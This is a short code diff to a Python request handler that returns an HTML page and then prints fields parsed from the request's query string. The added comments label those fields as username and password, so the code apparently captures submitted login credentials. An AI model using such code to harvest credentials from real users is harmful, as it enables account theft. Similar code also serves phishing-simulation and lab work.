@@ -41,8 +41,8 @@ class SSLRequestHandler(BaseRequestHandler):
         self.data = self.buildResponse()
         self.request.sendall(self.data)
         request = str(self.request.recv(1024)).split("/")[1].split("?")[1].split("&")
-        print(request[0])
-        print(request[1].split(" ")[0])
+        print(request[0]) #Username
+        print(request[1].split(" ")[0]) #Password
 
     def buildResponse(self):
         rep = """<html>
